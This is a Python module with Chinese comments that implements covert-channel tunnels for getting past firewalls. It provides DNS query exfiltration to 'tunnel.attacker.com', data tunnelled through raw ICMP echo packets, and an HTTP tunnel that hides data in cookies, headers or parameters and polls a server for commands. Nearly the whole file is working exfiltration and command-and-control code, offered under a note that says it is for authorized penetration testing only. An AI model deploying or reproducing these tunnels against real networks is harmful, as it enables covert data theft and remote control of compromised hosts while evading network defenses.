#!/usr/bin/env python3
"""
隧道模块 - Covert Channel Tunnels
功能: DNS 隧道、ICMP 隧道、HTTP 隧道
用于绕过防火墙和网络限制
仅用于授权渗透测试
"""

import socket
import struct
import base64
import hashlib
import time
import threading
import logging
import random
import select
from typing import Dict, List, Optional, Any, Callable, Tuple
from dataclasses import dataclass, field
from enum import Enum
import os

logger = logging.getLogger(__name__)

# DNS 库
try:
    import dns.resolver
    import dns.message
    import dns.query
    import dns.rdatatype
    HAS_DNSPYTHON = True
except ImportError:
    HAS_DNSPYTHON = False


@dataclass
class TunnelConfig:
    """隧道配置"""
    server: str
    port: int = 0
    encryption_key: Optional[str] = None
    chunk_size: int = 63  # DNS 标签最大长度
    timeout: float = 10.0


class DNSTunnel:
    """
    DNS 隧道

    通过 DNS 查询传输数据，可绕过大多数防火墙

    原理:
    - 客户端将数据编码到 DNS 查询的子域名中
    - 服务器从查询中提取数据，并通过 TXT/CNAME 等记录返回响应

    Usage (客户端):
        tunnel = DNSTunnel(domain="tunnel.attacker.com")
        tunnel.send("secret data")
        response = tunnel.receive()

    Usage (服务器):
        server = DNSTunnelServer(domain="tunnel.attacker.com")
        server.run()
    """

    def __init__(self,
                 domain: str,
                 nameserver: Optional[str] = None,
                 encryption_key: Optional[str] = None):
        """
        Args:
            domain: 隧道域名 (需要控制其 DNS 服务器)
            nameserver: 指定 DNS 服务器
            encryption_key: 加密密钥
        """
        self.domain = domain
        self.nameserver = nameserver or "8.8.8.8"
        self.encryption_key = encryption_key

        self.chunk_size = 63  # DNS 标签最大长度
        self.session_id = self._generate_session_id()

    def _generate_session_id(self) -> str:
        """生成会话 ID"""
        return hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

    def _encode_data(self, data: bytes) -> str:
        """编码数据为 DNS 安全格式"""
        # Base32 编码 (只包含字母和数字)
        encoded = base64.b32encode(data).decode().lower().rstrip('=')
        return encoded

    def _decode_data(self, encoded: str) -> bytes:
        """解码数据"""
        # 补齐 padding
        padding = 8 - (len(encoded) % 8)
        if padding != 8:
            encoded += '=' * padding
        return base64.b32decode(encoded.upper())

    def _encrypt(self, data: bytes) -> bytes:
        """加密数据"""
        if not self.encryption_key:
            return data

        key = self.encryption_key.encode()
        encrypted = bytes([
            data[i] ^ key[i % len(key)]
            for i in range(len(data))
        ])
        return encrypted

    def _decrypt(self, data: bytes) -> bytes:
        """解密数据"""
        return self._encrypt(data)  # XOR 是对称的

    def _split_data(self, data: str) -> List[str]:
        """将数据分割为 DNS 标签"""
        chunks = []
        for i in range(0, len(data), self.chunk_size):
            chunks.append(data[i:i + self.chunk_size])
        return chunks

    def send(self, data: str) -> bool:
        """
        通过 DNS 发送数据

        数据格式: <session>.<chunk_num>.<total>.<data>.tunnel.domain.com
        """
        if not HAS_DNSPYTHON:
            return self._send_raw(data)

        try:
            # 加密和编码
            encrypted = self._encrypt(data.encode())
            encoded = self._encode_data(encrypted)
            chunks = self._split_data(encoded)

            total = len(chunks)

            for i, chunk in enumerate(chunks):
                # 构造查询域名
                query_name = f"{self.session_id}.{i}.{total}.{chunk}.{self.domain}"

                try:
                    # 发送 DNS 查询
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [self.nameserver]
                    resolver.timeout = 5
                    resolver.lifetime = 5

                    # 使用 A 记录查询 (也可以用 TXT)
                    resolver.resolve(query_name, 'A')

                except dns.resolver.NXDOMAIN:
                    # 预期的响应
                    pass
                except dns.resolver.NoAnswer:
                    pass
                except Exception as e:
                    logger.debug(f"DNS query failed: {e}")

                # 小延迟避免速率限制
                time.sleep(0.1)

            return True

        except Exception as e:
            logger.error(f"DNS tunnel send failed: {e}")
            return False

    def _send_raw(self, data: str) -> bool:
        """使用原始 socket 发送 DNS 查询"""
        try:
            encrypted = self._encrypt(data.encode())
            encoded = self._encode_data(encrypted)
            chunks = self._split_data(encoded)

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            for i, chunk in enumerate(chunks):
                query_name = f"{self.session_id}.{i}.{len(chunks)}.{chunk}.{self.domain}"
                query = self._build_dns_query(query_name)
                sock.sendto(query, (self.nameserver, 53))

                try:
                    sock.recvfrom(512)
                except socket.timeout:
                    pass

                time.sleep(0.1)

            sock.close()
            return True

        except Exception as e:
            logger.error(f"Raw DNS send failed: {e}")
            return False

    def _build_dns_query(self, domain: str, qtype: int = 1) -> bytes:
        """构建 DNS 查询包"""
        # Transaction ID
        tid = random.randint(0, 65535)
        packet = struct.pack(">H", tid)

        # Flags (标准查询)
        packet += struct.pack(">H", 0x0100)

        # Questions, Answers, Authority, Additional
        packet += struct.pack(">HHHH", 1, 0, 0, 0)

        # Query name
        for label in domain.split('.'):
            packet += struct.pack("B", len(label)) + label.encode()
        packet += b'\x00'

        # Query type and class
        packet += struct.pack(">HH", qtype, 1)

        return packet

    def receive(self, record_type: str = "TXT") -> Optional[str]:
        """
        接收数据 (通过查询 TXT 记录)

        服务器将数据编码在 TXT 记录中返回
        """
        if not HAS_DNSPYTHON:
            return None

        try:
            # 查询响应域名
            query_name = f"response.{self.session_id}.{self.domain}"

            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.nameserver]

            answers = resolver.resolve(query_name, record_type)

            # 合并所有 TXT 记录
            data_parts = []
            for rdata in answers:
                if record_type == "TXT":
                    for txt in rdata.strings:
                        data_parts.append(txt.decode())
                else:
                    data_parts.append(str(rdata))

            # 解码
            encoded_data = ''.join(data_parts)
            decrypted = self._decrypt(self._decode_data(encoded_data))

            return decrypted.decode()

        except Exception as e:
            logger.debug(f"DNS receive failed: {e}")
            return None


class ICMPTunnel:
    """
    ICMP 隧道

    通过 ICMP Echo Request/Reply 传输数据

    注意: 需要 root 权限发送原始 ICMP 包

    Usage:
        tunnel = ICMPTunnel("attacker.com")
        tunnel.send("secret data")
    """

    ICMP_ECHO_REQUEST = 8
    ICMP_ECHO_REPLY = 0

    def __init__(self,
                 target: str,
                 encryption_key: Optional[str] = None):
        self.target = target
        self.encryption_key = encryption_key
        self.sequence = 0

    def _checksum(self, data: bytes) -> int:
        """计算 ICMP 校验和"""
        if len(data) % 2:
            data += b'\x00'

        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def _encrypt(self, data: bytes) -> bytes:
        """加密数据"""
        if not self.encryption_key:
            return data

        key = self.encryption_key.encode()
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

    def _build_icmp_packet(self, data: bytes) -> bytes:
        """构建 ICMP Echo Request 包"""
        # Type, Code, Checksum, ID, Sequence
        icmp_type = self.ICMP_ECHO_REQUEST
        icmp_code = 0
        checksum = 0
        icmp_id = os.getpid() & 0xFFFF
        self.sequence = (self.sequence + 1) & 0xFFFF

        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, self.sequence)
        checksum = self._checksum(header + data)
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, self.sequence)

        return header + data

    def send(self, data: str) -> bool:
        """通过 ICMP 发送数据"""
        try:
            # 创建原始 socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(5)

            # 加密数据
            encrypted = self._encrypt(data.encode())

            # 分块发送
            chunk_size = 1400  # MTU 限制
            for i in range(0, len(encrypted), chunk_size):
                chunk = encrypted[i:i + chunk_size]
                packet = self._build_icmp_packet(chunk)
                sock.sendto(packet, (self.target, 0))
                time.sleep(0.1)

            sock.close()
            return True

        except PermissionError:
            logger.error("ICMP tunnel requires root/administrator privileges")
            return False
        except Exception as e:
            logger.error(f"ICMP send failed: {e}")
            return False

    def receive(self, timeout: float = 10.0) -> Optional[str]:
        """接收 ICMP 响应"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(timeout)

            data_parts = []
            start_time = time.time()

            while time.time() - start_time < timeout:
                ready = select.select([sock], [], [], 1)
                if ready[0]:
                    packet, addr = sock.recvfrom(65535)

                    # 跳过 IP 头 (20 bytes)
                    icmp_header = packet[20:28]
                    icmp_type, icmp_code = struct.unpack("!BB", icmp_header[:2])

                    if icmp_type == self.ICMP_ECHO_REPLY:
                        # 提取数据
                        data = packet[28:]
                        data_parts.append(data)

            sock.close()

            if data_parts:
                combined = b''.join(data_parts)
                decrypted = self._encrypt(combined)  # XOR 解密
                return decrypted.decode(errors='ignore')

            return None

        except PermissionError:
            logger.error("ICMP receive requires root privileges")
            return None
        except Exception as e:
            logger.error(f"ICMP receive failed: {e}")
            return None


class HTTPTunnel:
    """
    HTTP 隧道

    通过 HTTP 请求传输数据，伪装成正常 Web 流量

    支持:
    - GET 参数隐写
    - POST 数据隐写
    - Cookie 隐写
    - 自定义 Header 隐写
    """

    def __init__(self,
                 server_url: str,
                 encryption_key: Optional[str] = None,
                 method: str = "POST"):
        """
        Args:
            server_url: 服务器 URL
            encryption_key: 加密密钥
            method: HTTP 方法
        """
        self.server_url = server_url
        self.encryption_key = encryption_key
        self.method = method.upper()

        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:16]

    def _encrypt(self, data: bytes) -> bytes:
        """加密"""
        if not self.encryption_key:
            return data
        key = self.encryption_key.encode()
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

    def _encode(self, data: bytes) -> str:
        """编码为 URL 安全格式"""
        return base64.urlsafe_b64encode(data).decode()

    def _decode(self, data: str) -> bytes:
        """解码"""
        return base64.urlsafe_b64decode(data)

    def send(self,
             data: str,
             hide_in: str = "body") -> Optional[str]:
        """
        发送数据

        Args:
            data: 要发送的数据
            hide_in: 隐藏位置 (body, cookie, header, param)
        """
        try:
            import requests as req

            encrypted = self._encrypt(data.encode())
            encoded = self._encode(encrypted)

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
                "Accept": "text/html,application/xhtml+xml,*/*",
                "Accept-Language": "en-US,en;q=0.9",
            }

            if hide_in == "cookie":
                headers["Cookie"] = f"session={self.session_id}; data={encoded}"
                response = req.get(self.server_url, headers=headers, timeout=30, verify=False)

            elif hide_in == "header":
                headers["X-Session-Data"] = encoded
                headers["X-Session-ID"] = self.session_id
                response = req.get(self.server_url, headers=headers, timeout=30, verify=False)

            elif hide_in == "param":
                params = {
                    "sid": self.session_id,
                    "d": encoded,
                    "_": str(int(time.time() * 1000)),
                }
                response = req.get(self.server_url, params=params, headers=headers, timeout=30, verify=False)

            else:  # body
                post_data = {
                    "session_id": self.session_id,
                    "data": encoded,
                    "timestamp": int(time.time()),
                }
                response = req.post(self.server_url, json=post_data, headers=headers, timeout=30, verify=False)

            if response.status_code == 200:
                # 尝试从响应中提取返回数据
                try:
                    resp_data = response.json()
                    if "data" in resp_data:
                        decrypted = self._encrypt(self._decode(resp_data["data"]))
                        return decrypted.decode()
                except Exception:
                    pass

                return response.text[:1000]

            return None

        except ImportError:
            logger.error("requests library not installed")
            return None
        except Exception as e:
            logger.error(f"HTTP tunnel send failed: {e}")
            return None

    def poll(self) -> Optional[str]:
        """轮询服务器获取命令"""
        try:
            import requests as req

            headers = {
                "User-Agent": "Mozilla/5.0",
                "X-Session-ID": self.session_id,
            }

            response = req.get(
                f"{self.server_url}/poll",
                headers=headers,
                timeout=30,
                verify=False
            )

            if response.status_code == 200:
                try:
                    data = response.json()
                    if "command" in data:
                        decrypted = self._encrypt(self._decode(data["command"]))
                        return decrypted.decode()
                except Exception:
                    pass

            return None

        except Exception as e:
            logger.debug(f"HTTP poll failed: {e}")
            return None


# 便捷函数
def create_dns_tunnel(domain: str,
                      nameserver: Optional[str] = None,
                      encryption_key: Optional[str] = None) -> DNSTunnel:
    """创建 DNS 隧道"""
    return DNSTunnel(domain, nameserver, encryption_key)


def create_icmp_tunnel(target: str,
                       encryption_key: Optional[str] = None) -> ICMPTunnel:
    """创建 ICMP 隧道"""
    return ICMPTunnel(target, encryption_key)


def create_http_tunnel(server_url: str,
                       encryption_key: Optional[str] = None) -> HTTPTunnel:
    """创建 HTTP 隧道"""
    return HTTPTunnel(server_url, encryption_key)


if __name__ == "__main__":
    print("Covert Channel Tunnels Module")
    print("=" * 50)
    print(f"dnspython available: {HAS_DNSPYTHON}")
    print("\n[!] This module is for authorized penetration testing only!")
    print("\nAvailable tunnels:")
    print("  - DNSTunnel: Exfiltrate data via DNS queries")
    print("  - ICMPTunnel: Tunnel data through ICMP packets")
    print("  - HTTPTunnel: Hide data in HTTP traffic")
